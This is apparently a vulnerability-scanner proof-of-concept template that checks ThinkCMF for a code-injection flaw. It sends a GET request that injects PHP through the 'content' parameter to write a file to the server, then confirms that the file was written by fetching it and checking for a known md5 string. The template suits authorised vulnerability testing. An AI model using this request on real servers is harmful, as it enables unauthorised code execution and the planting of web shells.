name: poc-yaml-thinkcmf-write-shell
set:
  r: randomInt(10000,20000)
rules:
  - method: GET
    path: "/index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+md5(123);%22);"
    expression: "true"
  - method: GET
    path: "/{{r}}.php"
    expression: |
      status == 200 && body.bcontains(b'202cb962ac59075b964b07152d234b70')

detail:
  author: violin
  ThinkCMF: x1.6.0/x2.1.0/x2.2.0-2
  links:
    - https://www.freebuf.com/vuls/217586.html
